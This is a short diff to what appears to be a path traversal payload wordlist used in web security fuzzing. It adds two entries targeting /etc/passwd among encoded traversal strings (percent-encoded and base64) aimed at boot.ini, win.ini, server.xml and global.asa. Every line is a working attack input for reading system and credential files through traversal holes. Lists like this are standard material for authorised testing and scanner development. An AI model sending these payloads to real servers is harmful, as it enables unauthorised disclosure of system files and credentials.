@@ -106,6 +106,8 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
 /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
 ../../../../../../../../conf/server.xml
+/etc/passwd
+//etc//passwd
 /boot.ini
 C:/inetpub/wwwroot/global.asa
 C:\inetpub\wwwroot\global.asa
